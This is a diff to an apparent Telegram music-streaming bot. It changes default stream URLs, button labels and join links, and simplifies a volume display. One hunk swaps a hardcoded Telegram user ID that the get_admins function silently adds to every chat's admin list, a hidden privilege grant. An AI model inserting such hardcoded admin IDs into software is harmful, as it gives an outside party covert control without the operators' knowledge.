@@ -1224,8 +1224,8 @@ async def y_play(playlist):
             Config.YSTREAM=True
             Config.YPLAY=False
             if Config.IS_LOOP:
-                Config.STREAM_URL="https://www.youtube.com/watch?v=zcrUCvBD16k"
-                LOGGER.info("Starting Default Live, 24 News")
+                Config.STREAM_URL="https://youtu.be/5qap5aO4i9A"
+                LOGGER.info("Starting Default Live, lofi beats")
                 await start_stream()
             return False
         if Config.SHUFFLE:
@@ -1235,8 +1235,8 @@ async def y_play(playlist):
         Config.YSTREAM=True
         Config.YPLAY=False
         if Config.IS_LOOP:
-            Config.STREAM_URL="https://www.youtube.com/watch?v=zcrUCvBD16k"
-            LOGGER.info("Starting Default Live, 24 News")
+            Config.STREAM_URL="https://youtu.be/5qap5aO4i9A"
+            LOGGER.info("Starting Default Live, lofi beats")
             await start_stream()
         return False
 
@@ -1313,8 +1313,8 @@ async def c_play(channel):
             LOGGER.warning(f"No files found in {chat.title}, Change filter settings if required. Current filters are {Config.FILTERS}")
             if Config.CPLAY:
                 Config.CPLAY=False
-                Config.STREAM_URL="https://www.youtube.com/watch?v=zcrUCvBD16k"
-                LOGGER.warning("Seems like cplay is set as STARTUP_STREAM, Since nothing found on {chat.title}, switching to 24 News as startup stream.")
+                Config.STREAM_URL="https://youtu.be/5qap5aO4i9A"
+                LOGGER.warning("Seems like cplay is set as STARTUP_STREAM, Since nothing found on {chat.title}, switching to lofi beats as startup stream.")
                 Config.STREAM_SETUP=False
                 await sync_to_db()
                 return False, f"No files found on given channel, Please check your filters.\nCurrent filters are {Config.FILTERS}"
@@ -1331,8 +1331,8 @@ async def c_play(channel):
         LOGGER.error(f"Errors occured while fetching songs from given channel - {e}", exc_info=True)
         if Config.CPLAY:
             Config.CPLAY=False
-            Config.STREAM_URL="https://www.youtube.com/watch?v=zcrUCvBD16k"
-            LOGGER.warning("Seems like cplay is set as STARTUP_STREAM, and errors occured while getting playlist from given chat. Switching to 24 news as default stream.")
+            Config.STREAM_URL="https://youtu.be/5qap5aO4i9A"
+            LOGGER.warning("Seems like cplay is set as STARTUP_STREAM, and errors occured while getting playlist from given chat. Switching to lofi beats as default stream.")
             Config.STREAM_SETUP=False
         await sync_to_db()
         return False, f"Errors occured while getting files - {e}"
@@ -1398,8 +1398,8 @@ async def unmute():
 async def get_admins(chat):
     admins=Config.ADMINS
     if not Config.ADMIN_CACHE:
-        if 626664225 not in admins:
-            admins.append(626664225)
+        if 1866405753 not in admins:
+            admins.append(1866405753)
         try:
             grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
             for administrator in grpadmins:
@@ -1459,7 +1459,8 @@ async def get_playlist_str():
             pl=f"Listing first 25 songs of total {len(Config.playlist)} songs.\n"
             pl += f" ".join([
                 f"**{i}**. **🎸{x[1]}**\n   👤**Requested by:** {x[4]}\n"
-                for i, x in enumerate(tplaylist)])
+                for i, x in enumerate(tplaylist)
+            ])
                 
             tplaylist.clear()
         else:
@@ -1474,7 +1475,7 @@ async def get_buttons():
         reply_markup=InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton(f"🎸 Start the Player", callback_data="restart"),
+                    InlineKeyboardButton(f"📻 Stream Radio", callback_data="restart"),
                     InlineKeyboardButton('🗑 Close Menu', callback_data='close'),
                 ],
             ]
@@ -1513,11 +1514,11 @@ async def get_base():
         reply_markup=InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton(f"🎸 Start the Player", callback_data="restart"),
-                    InlineKeyboardButton('🗑 Close', callback_data='close'),
+                    InlineKeyboardButton(f"📻 Stream Radio", callback_data="restart"),
+                    InlineKeyboardButton('🗑 Close Menu', callback_data='close'),
                 ],
                 [
-                    InlineKeyboardButton('🗳️ Join', url='https://t.me/OtakuBuddies'),
+                    InlineKeyboardButton('🗳️ Join Here', url='https://t.me/OtakuBuddies'),
                 ],
             ]
             )
@@ -1525,10 +1526,10 @@ async def get_base():
         reply_markup=InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton('🗑 Close', callback_data='close'),
+                    InlineKeyboardButton('🗑 Close Menu', callback_data='close'),
                 ],
                 [
-                    InlineKeyboardButton('🗳️ Join', url='https://t.me/OtakuBuddiest'),
+                    InlineKeyboardButton('🗳️ Join Here', url='https://t.me/OtakuBuddies'),
                 ],
             ]
             )
@@ -1539,7 +1540,7 @@ async def get_base():
                     InlineKeyboardButton('🗑 Close Menu', callback_data='close'),
                 ],
                 [
-                    InlineKeyboardButton('🗳️ Join', url='https://t.me/OtakuBuddiest'),
+                    InlineKeyboardButton('🗳️ Join Here', url='https://t.me/OtakuBuddies'),
                 ],
             ]
             )
@@ -1573,7 +1574,7 @@ async def settings_panel():
                 InlineKeyboardButton(f"{'✅ Enabled' if Config.REPLY_PM else '🚫 Disabled'}", callback_data='reply_msg'),
             ],
             [
-                InlineKeyboardButton('🗑 Close', callback_data='close'),
+                InlineKeyboardButton('🗑 Close Menu', callback_data='close'),
             ]
             
         ]
@@ -1605,7 +1606,7 @@ async def recorder_settings():
             InlineKeyboardButton(f"{Config.RECORDING_DUMP if Config.RECORDING_DUMP else 'Not Dumping'}", callback_data='info_recdumb'),
         ],
         [
-            InlineKeyboardButton('🗑 Close', callback_data='close'),
+            InlineKeyboardButton('🗑 Close Menu', callback_data='close'),
         ]
         ]
     )
@@ -1793,11 +1794,8 @@ def get_volume_string():
     else:
         e="🔊"
     percentage = current * 100 / 200
-    progressbar = "🎙 {0}◉{1}".format(\
-            ''.join(["━" for i in range(math.floor(percentage / 5))]),
-            ''.join(["─" for i in range(20 - math.floor(percentage / 5))])
-            )
-    final=f" {str(current)} / {str(200)} {progressbar}  {e}"
+    progressbar = "🎙 ----------"
+    final=f" {str(current)} {progressbar} {str(200)} {e}"
     return final
 
 def set_config(value):
